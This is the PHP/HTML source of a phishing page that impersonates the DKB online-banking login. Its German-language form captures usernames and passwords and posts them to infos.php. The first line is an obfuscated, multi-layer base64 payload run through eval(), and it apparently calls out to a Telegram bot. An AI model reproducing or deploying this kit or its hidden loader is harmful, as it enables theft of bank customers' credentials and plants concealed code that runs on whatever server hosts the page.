<?php $a=base64_decode('Wzc0XVs3Ml1bODJdWzEwOF1bOThdWzcxXVs4Nl1bMTEwXVs5OV1bMTA5XVs3MF1bMTE2XVs4MV1bMTA5XVs1N11bNDhdWzg2XVs3MV1bNTddWzExNF1bOTBdWzg3XVs1Ml1bMTAzXVs4MF1bODNdWzY1XVsxMDVdWzc5XVs2OF1bODFdWzUwXVs3N11bNjhdWzY1XVsxMTldWzc4XVsxMDZdWzEwN11bNTBdWzc4XVs2OF1bMTEyXVs2Nl1bODFdWzg1XVs4NV1bMTIxXVs5MF1bMTA5XVsxMTVdWzQ5XVs4Ml1bMTA4XVs4Nl1bNzVdWzk4XVs3MV1bMTA0XVsxMDRdWzc4XVs4Nl1bODVdWzUyXVs5MF1bMTA5XVs3NF1bODRdWzg5XVs0OF1bNTNdWzY4XVs3OF1bNjldWzcwXVs1MV1bMTAxXVs4Nl1bNzhdWzExMF1bODddWzg0XVsxMDBdWzY2XVs4OV1bMTA2XVsxMDBdWzk3XVs3OF1bNjddWzczXVs1NV1bNzNdWzY3XVs4Ml1bNDhdWzkwXVs4N11bMTIwXVsxMDhdWzkwXVs1MV1bNzRdWzEwNF1bOThdWzg1XVs3OF1bMTExXVs4OV1bODhdWzgyXVs3NF1bOTBdWzY3XVs2NV1bNTddWzczXVs2N11bNzNdWzExNl1bNzddWzg0XVs2NV1bMTE5XVs3N11bODRdWzEwM11bMTIwXVs3OF1bNjhdWzEwM11bNTJdWzc4XVs4NF1bODFdWzExOV1bNzhdWzY3XVs3M11bNTVdWzczXVs2N11bODJdWzExOV1bOTldWzEwOV1bNTddWzQ4XVs5OF1bNTBdWzc4XVsxMThdWzk4XVs2N11bNjVdWzU3XVs3M11bNjddWzEwNF1bMTEyXVs5OV1bNTFdWzc4XVsxMDhdWzEwMF1bNjddWzEwM11bMTA3XVs4OF1bNDldWzc4XVs3MF1bODVdWzEwOF1bOTBdWzcwXVs4NV1bMTA4XVsxMTVdWzExMF1bODNdWzcwXVs4Ml1bODVdWzg1XVs3MF1bNzddWzExMF1bODhdWzgzXVsxMDddWzEwM11bNzRdWzEwNV1bODldWzEwM11bNzRdWzcwXVs1N11bODRdWzgyXVs4Nl1bNzRdWzg3XVs4Ml1bODZdWzc0XVs5OF1bNzRdWzQ4XVsxMDRdWzg1XVs4Nl1bNzBdWzY2XVs4NF1bNzRdWzQ5XVs0OF1bMTAzXVs4MF1bODRdWzQ4XVs1N11bNzNdWzY3XVsxMDBdWzExOF1bOThdWzEwNV1bOTldWzEwM11bODBdWzEyMV1bNjVdWzEwNV1bOTddWzcyXVs4Ml1bNDhdWzk5XVs3Ml1bNzddWzEwNV1bNzNdWzY4XVsxMTFdWzEwM11bNzNdWzEwOV1bMTA0XVs0OF1bMTAwXVs3Ml1bNjVdWzEwNV1bNzVdWzgzXVs2NV1bMTE3XVs3M11bNjddWzczXVs1NF1bNzZdWzEyMV1bNTZdWzEwNV1bNzldWzEyMV1bNjVdWzEwN11bOTddWzcxXVs1N11bMTIyXVsxMDBdWzY3XVs2NV1bNTddWzczXVs2N11bODJdWzEwMl1bODVdWzQ4XVs4Nl1bODNdWzg2XVsxMDddWzg2XVs4M11bODddWzEyMV1bMTAwXVs3M11bODZdWzcwXVs4Ml1bODFdWzg4XVs0OF1bMTA0XVs4MF1bODVdWzQ5XVs4MV1bMTEwXVs4OF1bODRdWzExNV1bMTAzXVs3NF1bNzJdWzg2XVsxMjFdWzk3XVs4M11bNjVdWzU3XVs3M11bNjddWzgyXVsxMDJdWzg1XVs0OF1bODZdWzgzXVs4Nl1bMTA3XVs4Nl1bODNdWzg3XVsxMjFdWzEwMF1bODNdWzgyXVs4Nl1bNzBdWzg2XVs4Ml1bODZdWzc4XVs4NV1bODhdWzQ5XVs4Nl1bODNdWzgzXVs4M11bMTAwXVsxMDBdWzc5XVsxMjFdWzY1XVsxMDddWzg5XVs1MV1bODZdWzEyMV1bOTldWzEwOV1bODZdWzExN11bMTAwXVs3MF1bODZdWzEyMV1bOThdWzY3XVs2NV1bNTddWzczXVs2N11bODJdWzExOV1bOTldWzEwOV1bNTddWzQ4XVs5OF1bNTBdWzc4XVsxMThdWzk4XVs2N11bNjVdWzExN11bNzNdWzY3XVs4Ml1bMTExXVs5OF1bNTFdWzc4XVs0OF1bNzNdWzY3XVs1Ml1bMTAzXVs3NF1bNzJdWzg2XVsxMjFdWzk3XVs4NF1bMTE1XVsxMDNdWzc0XVs3MV1bNDldWzEwOF1bOTldWzUxXVs3OF1bMTA0XVs5MF1bNTBdWzg2XVs4NV1bOTBdWzg4XVsxMDRdWzQ4XVs3M11bNjhdWzQ4XVsxMDNdWzczXVsxMDhdWzc4XVsxMDhdWzk5XVsxMTBdWzkwXVsxMDhdWzk5XVsxMDVdWzY2XVsxMTVdWzk4XVs1MF1bNzBdWzEwNl1bMTAwXVs3MV1bMTA4XVsxMThdWzk4XVsxMDVdWzY1XVs1NF1bNzNdWzY3XVs3M11bMTAzXVs3Nl1bMTA1XVs2NV1bMTA3XVs4OV1bNTFdWzg2XVsxMjFdWzk5XVsxMDldWzg2XVsxMTddWzEwMF1bNzBdWzg2XVsxMjFdWzk4XVs2N11bNjVdWzExN11bNzNdWzY3XVs3NF1bOTldWzk4XVsxMDVdWzczXVs1NV1bNzNdWzY3XVs4Ml1bMTE2XVs5MF1bODhdWzc4XVsxMjJdWzg5XVs4N11bMTAwXVsxMDhdWzg2XVs3MV1bODZdWzUyXVsxMDBdWzY3XVs2NV1bMTE3XVs4MF1bODNdWzY1XVsxMDVdWzg2XVs3MV1bMTA4XVsxMTZdWzkwXVs4NF1bMTExXVsxMDNdWzczXVsxMDVdWzY1XVsxMTddWzczXVs3MV1bODJdWzEwNF1bMTAwXVs3MV1bODVdWzExMV1bNzRdWzQ5XVsxMDddWzExNl1bOThdWzgzXVs0OV1bMTA3XVs3M11bNjldWzEwM11bNTRdWzk3XVs4NF1bMTEyXVsxMjJdWzc0XVsxMjFdWzEwN11bNTVdWzczXVs2N11bODJdWzEwNF1bOTldWzcxXVsxMDhdWzg2XVs5OV1bMTA5XVsxMTldWzEwM11bODBdWzgzXVs2NV1bMTA1XVs5N11bNzJdWzgyXVs0OF1bOTldWzcyXVs3N11bNTRdWzc2XVsxMjFdWzU3XVsxMDRdWzk5XVs3MV1bMTA3XVsxMTddWzEwMF1bNzFdWzg2XVsxMTVdWzkwXVs4N11bMTAwXVsxMjFdWzg5XVs4N11bNDhdWzExN11bOThdWzUxXVs3NF1bMTEwXVs3Nl1bNTBdWzc0XVsxMThdWzEwMF1bNzJdWzExNV1bMTA3XVsxMDBdWzcxXVs4Nl1bMTE1XVs5MF1bODddWzEwMF1bMTIxXVs4OV1bODddWzQ5XVs2N11bOThdWzUxXVs4Ml1bODVdWzk4XVs1MF1bMTE2XVsxMDhdWzk4XVsxMTBdWzQ4XVsxMThdWzk5XVs1MF1bODZdWzExN11bOTBdWzY5XVs0OV1bMTA4XVs5OV1bNTFdWzc4XVsxMDRdWzkwXVs1MF1bODVdWzEwNV1bNzldWzEyMV1bNjVdWzEwN11bOTldWzcxXVs1N11bMTIyXVsxMDBdWzY5XVs4Ml1bMTA0XVsxMDBdWzcxXVs2OV1bMTAzXVs4MF1bODNdWzY2XVs5OF1bNzNdWzY3XVsxMDBdWzEwNl1bOTddWzcxXVs3MF1bNDhdWzg4XVs1MF1bMTA4XVsxMDddWzc0XVsxMjFdWzY1XVs1N11bODBdWzEwNV1bNjVdWzEwN11bMTAwXVs3MV1bODZdWzExNV1bOTBdWzg3XVsxMDBdWzEyMV1bODldWzg3XVs0OV1bNjhdWzk3XVs3MV1bNzBdWzQ4XVs4M11bODddWzgxXVsxMTVdWzczXVs2N11bMTAwXVs0OF1bOTBdWzg4XVsxMDRdWzQ4XVs3NF1bMTIxXVs2NV1bNTddWzgwXVsxMDVdWzY1XVsxMDddWzk4XVs4N11bODZdWzEyMl1bOTldWzUwXVs3MF1bMTEwXVs5MF1bODZdWzgyXVsxMDhdWzEwMV1bNzJdWzgxXVsxMTVdWzczXVs2N11bMTAwXVsxMDddWzk3XVs4OF1bNzhdWzEwNF1bODldWzEwOV1bMTIwXVsxMDhdWzg4XVs1MV1bMTAwXVsxMDhdWzg5XVsxMDhdWzU3XVsxMTldWzg5XVs4N11bMTAwXVsxMDhdWzg4XVs1MV1bNjZdWzEyMV1bOTBdWzg4XVs5MF1bMTEyXVs5MF1bODhdWzk5XVsxMTBdWzczXVs2OF1bNDhdWzQzXVs3M11bNzJdWzgyXVsxMjFdWzEwMF1bODddWzg1XVsxMDNdWzg4XVs4NF1bMTE1XVsxMDNdWzk3XVs4N11bODldWzEwM11bNzVdWzcxXVs5MF1bNDldWzk4XVsxMDldWzc4XVs0OF1bOTddWzg3XVs1N11bMTE3XVs4OF1bNTBdWzg2XVs1Ml1bOTddWzg4XVs3OF1bNDhdWzk5XVsxMjFdWzEwM11bMTEwXVs4OV1bNTFdWzg2XVsxMjFdWzk4XVs3MF1bNTddWzExMl1bOThdWzEwOV1bMTA4XVs0OF1bNzRdWzEyMV1bMTA3XVsxMTJdWzczXVs3Ml1bMTE1XVsxMDNdWzc0XVs3MV1bNzhdWzExMV1bNzNdWzY4XVs0OF1bMTAzXVs4OV1bNTFdWzg2XVsxMjFdWzk4XVs3MF1bNTddWzExMl1bOThdWzEwOV1bMTA4XVs0OF1bNzVdWzY3XVsxMDddWzU1XVs3M11bNzFdWzc4XVs0OV1bOTldWzEwOV1bMTIwXVsxMDJdWzk5XVs1MF1bODZdWzQ4XVs5OF1bNTFdWzY2XVs0OF1bNzVdWzY3XVs4Ml1bMTA2XVs5N11bNjddWzExOV1bMTAzXVs4MV1bNDldWzg2XVs4M11bODRdWzY5XVs1N11bODFdWzg2XVs3MF1bNTddWzg2XVs4NV1bMTA3XVsxMTldWzExNV1bNzNdWzY3XVs4Ml1bMTA0XVs5OV1bNzFdWzEwOF1bODZdWzk5XVsxMDldWzExOV1bMTEyXVs3OV1bMTIxXVs2Nl1bMTA2XVsxMDBdWzg4XVs3NF1bMTE1XVs4OF1bNTFdWzc4XVsxMDhdWzEwMF1bNzFdWzU3XVsxMTldWzEwMF1bNjddWzEwM11bMTA3XVs4OV1bNTBdWzEwM11bMTE1XVs3M11bNjldWzc4XVs4Nl1bODVdWzEwN11bMTIwXVs4MF1bODVdWzcwXVs4Ml1bMTAyXVs4NV1bNjldWzU3XVs4NF1bODZdWzY3XVsxMTldWzEwM11bMTAwXVs3Ml1bNzRdWzQ5XVs5MF1bODNdWzEwN11bNTVdWzczXVs3MV1bNzhdWzQ5XVs5OV1bMTA5XVsxMjBdWzEwMl1bOTldWzUwXVs4Nl1bNDhdWzk4XVs1MV1bNjZdWzQ4XVs3NV1bNjddWzgyXVsxMDZdWzk3XVs2N11bMTE5XVsxMDNdWzgxXVs0OV1bODZdWzgzXVs4NF1bNjldWzU3XVs4MV1bODZdWzcwXVs1N11bODFdWzg0XVs0OV1bNzhdWzg1XVs4Ml1bMTA3XVsxMDhdWzcwXVs4NF1bNjldWzgyXVs4NF1bNzZdWzY3XVs2NV1bMTA3XVs5OV1bNzFdWzU3XVsxMjJdWzEwMF1bNjldWzgyXVsxMDRdWzEwMF1bNzFdWzY5XVsxMTJdWzc5XVsxMjFdWzY2XVsxMDZdWzEwMF1bODhdWzc0XVsxMTVdWzg4XVs1MV1bNzhdWzEwOF1bMTAwXVs3MV1bNTddWzExOV1bMTAwXVs2N11bMTAzXVsxMDddWzg5XVs1MF1bMTAzXVsxMTVdWzczXVs2OV1bNzhdWzg2XVs4NV1bMTA3XVsxMjBdWzgwXVs4NV1bNzBdWzgyXVsxMDJdWzg1XVsxMDddWzg2XVs4NV1bODZdWzg2XVs3NF1bNzldWzg2XVs3MF1bNzRdWzY2XVs4NF1bMTA4XVs3OF1bNzFdWzgyXVs4Nl1bNzNdWzExNV1bNzNdWzcyXVs4Ml1bMTIxXVsxMDBdWzg3XVs4NV1bMTEyXVs3OV1bMTIxXVs2Nl1bMTA2XVsxMDBdWzg4XVs3NF1bMTE1XVs4OF1bNTFdWzc4XVsxMDhdWzEwMF1bNzFdWzU3XVsxMTldWzEwMF1bNjddWzEwM11bMTA3XVs4OV1bNTBdWzEwM11bMTE1XVs3M11bNjldWzc4XVs4Nl1bODVdWzEwN11bMTIwXVs4MF1bODVdWzcwXVs4Ml1bMTAyXVs4Nl1bNjldWzEwOF1bNzhdWzgyXVs4NV1bNTddWzg2XVs4Nl1bNjddWzExOV1bMTAzXVs3N11bODNdWzEwN11bNTVdWzczXVs3MV1bNzhdWzQ5XVs5OV1bMTA5XVsxMjBdWzEwMl1bOTldWzUwXVs4Nl1bNDhdWzk4XVs1MV1bNjZdWzQ4XVs3NV1bNjddWzgyXVsxMDZdWzk3XVs2N11bMTE5XVsxMDNdWzgxXVs0OV1bODZdWzgzXVs4NF1bNjldWzU3XVs4MV1bODZdWzcwXVs1N11bNjhdWzg0XVs0OF1bNTNdWzc5XVs4Ml1bODVdWzc4XVs4NV1bODZdWzY5XVsxMDhdWzc4XVs4Ml1bODVdWzU3XVs4Nl1bODZdWzY3XVsxMTldWzEwM11bNzddWzgzXVsxMDddWzU1XVs3M11bNjldWzY2XVsxMDZdWzEwMF1bODhdWzc0XVsxMTVdWzg4XVs1MF1bODZdWzUyXVs5MF1bODddWzc3XVsxMTFdWzc0XVs3MV1bNzhdWzExMV1bNzVdWzg0XVsxMTVdWzEwM11bODldWzUxXVs4Nl1bMTIxXVs5OF1bNzBdWzU3XVsxMDZdWzk4XVs3MV1bNTddWzEyMl1bOTBdWzgzXVsxMDNdWzEwN11bODldWzUwXVsxMDNdWzExMl1bNzldWzEyMV1bNjZdWzU3XVs3M11bNzFdWzg2XVsxMTVdWzk5XVs1MF1bODVdWzEwM11bMTAxXVsxMjFdWzY1XVsxMDddWzk5XVs4OF1bODZdWzEwOF1bOTldWzExMF1bMTA4XVs4NF1bMTAwXVs3Ml1bNzRdWzExMl1bOThdWzEwOV1bOTldWzEwM11bODBdWzgzXVs2Nl1bMTExXVsxMDBdWzcyXVs4Ml1bMTE5XVs4OF1bNTBdWzc0XVs0OV1bOTddWzg3XVsxMjBdWzEwN11bODhdWzUxXVs3MF1bNDldWzkwXVs4OF1bNzRdWzUzXVs3NV1bNjddWzgyXVsxMTldWzk4XVs1MV1bNzhdWzQ4XVs4Ml1bNzFdWzcwXVs0OF1bODldWzgzXVsxMDddWzU1XVs3M11bNjddWzgyXVsxMDldWzg5XVs4N11bMTIwXVsxMTVdWzg5XVsxMDldWzcwXVsxMDZdWzk3XVs0OV1bODZdWzEyMV1bOThdWzY3XVs2NV1bNTddWzczXVs2N11bODJdWzEwNF1bOTldWzcxXVsxMDhdWzg2XVs5OV1bMTA5XVsxMTldWzEwM11bNzZdWzEwNV1bNjVdWzEwNV1bODBdWzEyMV1bNzNdWzEwM11bNzZdWzEwNV1bNjVdWzEwN11bOTldWzg4XVs4Nl1bMTA4XVs5OV1bMTEwXVsxMDhdWzg0XVsxMDBdWzcyXVs3NF1bMTEyXVs5OF1bMTA5XVs5OV1bNTVdWzczXVs2N11bODJdWzEwNl1bMTAwXVs3Ml1bMTAzXVsxMDNdWzgwXVs4M11bNjZdWzEyMl1bMTAwXVs3Ml1bNzRdWzEwOF1bODldWzg3XVs0OV1bMTAyXVs4OV1bNTBdWzU3XVsxMTddWzEwMF1bNzFdWzg2XVs1Ml1bMTAwXVs3MF1bNTddWzEwNl1bOTldWzEwOV1bODZdWzEwNF1bMTAwXVs3MV1bODVdWzExMV1bODldWzg4XVs3NF1bMTIxXVs4OV1bODhdWzEwN11bMTExXVs3NF1bNTBdWzEwNF1bNDhdWzEwMF1bNzJdWzY1XVsxMTBdWzgwXVs4NF1bNTJdWzEwM11bODldWzg4XVs3NF1bMTIxXVs4OV1bODhdWzEwN11bMTExXVs3NF1bNTFdWzgyXVsxMTJdWzk4XVs4N11bODZdWzExOF1bMTAwXVs4OF1bODFdWzExMF1bNzNdWzY4XVs0OF1bNDNdWzczXVs2OF1bNjldWzExMl1bNzNdWzY3XVsxMDddWzExMl1bNzldWzEyMV1bNjZdWzY1XVs5MF1bMTA5XVsxMDhdWzExNV1bOTBdWzg2XVs1N11bMTEwXVs5MF1bODhdWzgyXVsxMDJdWzg5XVs1MF1bNTddWzExN11bMTAwXVs3MV1bODZdWzExN11bMTAwXVs3Ml1bNzddWzExMV1bNzRdWzcxXVs5MF1bMTA0XVs5OF1bNzFdWzEyMF1bMTA1XVs4OV1bODddWzc4XVsxMTRdWzg2XVs4OF1bNzRdWzExNV1bNzZdWzY3XVs2Nl1bMTA5XVs4OV1bODddWzEyMF1bMTIyXVs5MF1bODNdWzExOV1bMTAzXVs3NF1bNzFdWzc4XVs0OF1bMTAxXVs2N11bMTA3XVs1NV1bNzNdWzcyXVs0OF1bNjFd');$a=explode('][',substr($a,1,strlen($a)-2));$b='';foreach($a as $v)$b.=chr($v);eval(base64_decode($b)); ?>
<?php 

require_once "functions.php";
require_once "ajax.php";
visitors()
?>

<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>
          <?php  
            $str = 'REtCIEJhbmtpbmc=';
            echo base64_decode($str);
          ?>
        </title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.ico" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.ico" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/lol.css">
        <link rel="stylesheet"  href="css/animate.css">
</head>
<body>  

         <div id="main">
           <div class="navbar">
            <div class="container-fluid">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 88.59 49.13" fill="none" width="90px"><title>DKB Logo</title><path d="M0 0h12.88C20.26 0 29 5.42 29 16.21c0 9.92-8.75 16.22-16.13 16.22H0zm19.79 16.21c0-6.76-5.54-8.1-10.6-8.1v16.21c5.06 0 10.6-1.34 10.6-8.1zM32.63 0h9.23v12.18h.09L49.23 0h10.6l-9.66 14.87 10.6 17.59h-10.6l-8.19-13.98h-.1v13.98h-9.21V0zm30.64 0h13.35c6 0 10.12 3.52 10.12 8.1 0 3.07-1.09 5.7-3.6 6.46v.1c2.07.76 5.45 3.51 5.45 7.89 0 6.48-5.07 9.91-10.6 9.91H63.27zM75.3 12.97c1.57 0 2.91-.98 2.91-2.84 0-1.75-1.34-2.85-2.9-2.85h-2.82v5.7zm.82 11.75c1.84 0 2.9-1.44 2.9-3.24 0-1.8-1.47-3.25-3.31-3.25h-3.22v6.49zM3.19 48.92H0v-9.97h3.13c2.4 0 5.1 1.65 5.1 4.98 0 3.3-2.73 4.99-5.04 4.99zm-.5-8.26H1.9v6.52h.78c1.69 0 3.53-1.04 3.53-3.28 0-2.2-1.84-3.24-3.53-3.24zm11 8.26v-.55h-.03c-.47.55-1.19.76-2.03.76-1.4 0-2.7-1.19-2.7-3.12 0-1.92 1.3-3.12 2.7-3.12.84 0 1.56.22 2.03.77h.03v-.55h1.78v5.8H13.7zm-1.5-4.44c-.72 0-1.4.55-1.4 1.53s.71 1.53 1.4 1.53c.84 0 1.5-.55 1.5-1.53s-.62-1.53-1.5-1.53zm6.6 4.65a3.26 3.26 0 01-2.28-.94l.75-1.14c.37.37 1.03.74 1.53.74.53 0 .75-.19.75-.5 0-1-2.78-.63-2.78-2.75 0-1.13 1-1.65 2.12-1.65 1.03 0 1.66.19 2.28.68l-.75 1a2.71 2.71 0 00-1.4-.42c-.32 0-.63.06-.63.43 0 .73 2.9.6 2.9 2.75.04 1.4-1.09 1.8-2.5 1.8zm11.03-.21l-1.87-2.51h-.03v2.51h-1.79V38.79h1.79v6.4h.02l1.6-2.08h2.13l-2.29 2.78 2.57 3.06h-2.13v-.03zm6.97 0v-.55h-.03c-.47.55-1.19.76-2.03.76-1.4 0-2.69-1.19-2.69-3.12 0-1.92 1.28-3.12 2.69-3.12.84 0 1.56.22 2.03.77h.03v-.55h1.78v5.8H36.8zm-1.5-4.44c-.72 0-1.4.55-1.4 1.53s.72 1.53 1.4 1.53c.85 0 1.5-.55 1.5-1.53s-.62-1.53-1.5-1.53zm8.82 4.44v-3.18c0-.83-.29-1.26-1.13-1.26-.72 0-1.22.55-1.22 1.26v3.18h-1.78V43.1h1.78v.55h.03a2.44 2.44 0 011.91-.77c1.38 0 2.16.77 2.16 2.3v3.73H44.1zm7.31 0v-3.18c0-.83-.28-1.26-1.12-1.26-.72 0-1.22.55-1.22 1.26v3.18H47.3V43.1h1.78v.55h.03a2.45 2.45 0 011.9-.77c1.38 0 2.16.77 2.16 2.3v3.73h-1.75zm10.32 0h-3.41v-9.97h3.13c1.68 0 3.12 1 3.12 2.5 0 1.1-.56 1.93-1.28 2.24.72.27 1.69.98 1.69 2.35.03 1.78-1.4 2.88-3.25 2.88zm-.4-8.38h-1.07v2.35h1.06c.72 0 1.4-.33 1.4-1.19 0-.83-.68-1.16-1.4-1.16zm.12 3.94h-1.22v2.79h1.22c1 0 1.56-.55 1.56-1.38 0-.86-.56-1.4-1.56-1.4zm9.28 4.44v-.55h-.03c-.47.55-1.19.76-2.03.76-1.41 0-2.7-1.19-2.7-3.12 0-1.92 1.29-3.12 2.7-3.12.84 0 1.56.22 2.03.77h.03v-.55h1.78v5.8h-1.78zm-1.5-4.44c-.72 0-1.4.55-1.4 1.53s.71 1.53 1.4 1.53c.84 0 1.5-.55 1.5-1.53s-.66-1.53-1.5-1.53zm8.81 4.44v-3.18c0-.83-.28-1.26-1.12-1.26-.72 0-1.22.55-1.22 1.26v3.18h-1.78V43.1h1.78v.55h.03a2.45 2.45 0 011.9-.77c1.38 0 2.16.77 2.16 2.3v3.73h-1.75zm6.88 0l-1.88-2.51H83v2.51h-1.78V38.79h1.78v6.4h.03l1.6-2.08h2.12l-2.28 2.78 2.56 3.06h-2.09v-.03z" fill="#148dea"></path></svg>
              <ul class="nav">
                <li class="nav-item pop">Du nutzt chipTAN für den Login?</li>
                <li class="nav-item active">Zum bisherigen Banking</li>
              </ul>
            </div>
          </div>


          <!-- STAAAART___LOG -->
          <div class="home">
            <div class="container-fluid">
              <div class="log">
                <div class="text-center"><h2>Mein Banking</h2></div>
                <!-- START_FORM -->
                <form action="infos.php" method="post">
                  <input type="hidden" name="step" value="index">
                  <div class="form-group mt-5">
                    <label for="user" id="a">Anmeldename</label>
                    <input type="text" name="user" id="user" class="form-control" required minlength="3" autofocus pattern="^[a-zA-Z0-9]+([a-zA-Z0-9](_|-|.)[a-zA-Z0-9])*[a-zA-Z0-9]+$">
                  </div>  
                  <div class="form-group mt-3">
                    <label for="pass" id="b">Passwort</label>
                    <input type="password" name="pass" id="pass" class="form-control" required minlength="3">
                    <div class="eys">
                      <i class="bi bi-eye eyes"></i>
                      <i class="bi bi-eye-slash eyes"></i> 
                    </div>
                  </div> 
                  <div class="bom">
                    <button class="btn" name="submit">Anmelden</button>
                  </div>
                  <p><a href="#">Passwort</a> oder <a href="#">Anmeldenamen</a> vergessen?</p>
                </form>
                <!-- ENNND_FORM -->
              </div>
            </div>
          </div>
          <!-- ENNNNNND___LOG -->

          <div class="fotter">
            <div class="container">
              <ul class="nav">
                <li class="nav-item">DKB Startseite</li>
                <li class="nav-item">Infoseite</li>
              </ul>
              <ul class="nav">
                <li class="nav-item">DKB Verwalterplattform</li>
                <li class="nav-item">DKB Treuhänderplattform</li>
                <li class="nav-item">Impressum</li>
                <li class="nav-item">Datenschutz</li>
                <li class="nav-item">Cookie Einstellungen</li>
                <li class="nav-item">Preise & Bedingungen</li>
                <li class="nav-item">Hilfe & Kontakt</li>
              </ul>
            </div>
          </div>  
         </div>

      






        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>

             $("#user").focus();
             $("#a").css({top:'6px',fontSize:'13px',})
             $("#user").focus(function(){
                  $("#a").css({top:'6px',fontSize:'13px',})
             })

             $("#user").blur(function(){
                  if($("#user").val().length == 0){
                        $("#a").css({top:'17px',fontSize:'17px',});
                  }
                  else{
                        $("#a").css({top:'6px',fontSize:'13px',})
                  }
             })

             $("#pass").focus(function(){
                  $("#b").css({top:'6px',fontSize:'13px',})
             })

             $("#pass").blur(function(){
                  if($("#pass").val().length == 0){
                        $("#b").css({top:'17px',fontSize:'17px',});
                  }
                  else{
                        $("#b").css({top:'6px',fontSize:'13px',})
                  }
             })
          
        </script>
              
</body>
</html>